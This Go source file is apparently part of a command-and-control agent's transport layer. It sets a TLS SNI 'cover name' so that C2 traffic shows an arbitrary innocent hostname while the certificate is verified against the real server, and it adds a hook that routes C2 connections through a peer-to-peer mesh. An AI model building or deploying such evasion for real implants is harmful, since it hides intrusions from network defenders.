package transport

// tls_common.go holds the TLS bits that are independent of the TLS client
// implementation (uTLS or crypto/tls): C2 SNI configuration and the mesh
// dialer hook. Keeping them here lets tls.go be compiled out under `no_utls`
// without losing SetC2ServerName/GlobalMeshDialer for the rest of the agent.

import (
	"context"
	"net"
	"net/http"
	"strings"
	"sync/atomic"
)

// httpRoundTripper is the baseline HTTP transport used for plain HTTP
// connections and as the proxy-only transport inside the uTLS wrapper.
var httpRoundTripper *http.Transport = http.DefaultTransport.(*http.Transport).Clone()

// c2ServerName stores the operator-configured SNI override for C2 TLS.
var c2ServerName atomic.Value // string

// SetC2ServerName sets the SNI presented on C2 TLS connections. An empty value
// uses the C2 address host. The C2 TLS listener does not select a certificate
// by SNI, so this can be an arbitrary cover name; the server certificate is
// still verified against the real C2 host.
func SetC2ServerName(name string) {
	c2ServerName.Store(strings.TrimSpace(name))
}

// c2ServerNames returns the SNI to send and the name to verify the server
// certificate against. Without an override both are the C2 host, which also
// lets crypto/tls omit SNI for IP literals.
func c2ServerNames(c2Host string) (sni, verifyName string) {
	if custom, _ := c2ServerName.Load().(string); custom != "" {
		return custom, c2Host
	}
	return c2Host, ""
}

// GlobalMeshDialer, when set, routes all C2 TLS dials through the P2P mesh.
var GlobalMeshDialer func(ctx context.Context, network, addr string) (net.Conn, error)
